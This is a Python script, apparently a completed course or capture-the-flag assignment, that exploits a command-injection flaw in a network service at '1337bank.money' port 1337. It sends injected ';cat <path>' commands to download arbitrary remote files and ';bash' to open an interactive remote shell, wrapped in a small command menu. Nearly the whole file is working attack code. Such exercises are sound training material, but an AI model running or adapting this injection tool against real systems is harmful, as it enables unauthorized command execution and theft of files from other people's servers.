#!/usr/bin/python3
"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket

host = "1337bank.money" # IP address here
port = 1337 # Port here

def execute_cmd(inp):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    cmd = inp[0]

    if cmd == "quit":
        exit(0)
    elif cmd == "pull" and len(inp) == 3:
        pull_from_v0id(inp)
    elif cmd == "help":
        print_help()
    elif cmd == "shell":
        connect_to_v0id()
    else:
        print_help()

def pull_from_v0id(inp):
    remote = inp[1]
    local = inp[2]
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    data = s.recv(1024)
    
    s.send(b";cat " + bytes(remote, "ascii") + b"\n")   # Send a newline \n at the end of your command
    data = s.recv(962) # Remove dig prompt

    out = open(local, "wb")
    
    data = s.recv(1024)
    while(data):
        out.write(data)
        data = s.recv(1024)

    print("Download complete")
    out.close()
    s.close()


def print_help():
    print("Possible commands for this shell")
    print("1) shell - Drop into an interactive shell and allows users to gracefully exit")
    print("2) pull <remote-path> <local-path> - Download files")
    print("3) help - Print this help message")
    print("4) quit - Quit the shell")

def connect_to_v0id():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    data = s.recv(1024)
    
    s.send(b";bash\n")   # Send a newline \n at the end of your command
    data = s.recv(2048)

    while True:
        inp = input("/> ").split(" ")

        cmd = inp[0]
        args = inp[1:len(inp)]

        if cmd == "exit":
            break
        
        s.send(bytes(" ".join(inp) + "\n", "ascii"))
        
        if cmd != "cd":
            data = s.recv(1024)
            print(data.decode("ascii"))

    s.close()



if __name__ == '__main__':
    while True:
        inp = input("> ").split(" ")
        
        execute_cmd(inp)

